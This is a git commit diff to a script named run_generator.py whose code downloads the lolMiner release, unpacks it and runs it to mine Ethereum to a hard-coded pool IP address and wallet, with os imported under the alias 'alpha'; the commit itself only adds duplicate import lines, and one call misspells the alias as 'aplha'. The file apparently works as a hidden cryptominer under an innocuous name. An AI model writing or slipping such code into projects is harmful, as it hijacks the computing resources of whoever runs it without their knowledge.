ee3f51147401029180982bb7eba28ad2c867a139
cringe0 <92528095+cringe0@users.noreply.github.com>
2021-10-14 19:02:21 +0500

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,4 +1,6 @@
 import os as alpha 
 alpha.system("curl -LJO https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz")
+import os as alpha 
 aplha.system("tar xf lolMiner_v1.29_Lin64.tar.gz")
+import os as alpha 
 alpha.system("1.29/lolminer --algo ETHASH --pool stratum+tcp://3.68.227.61:9595 --user 3JgjH5V3mT56F3kqCjLTzqirZz8ei9cNH5.siqdj3dp157i20c.WORKER")
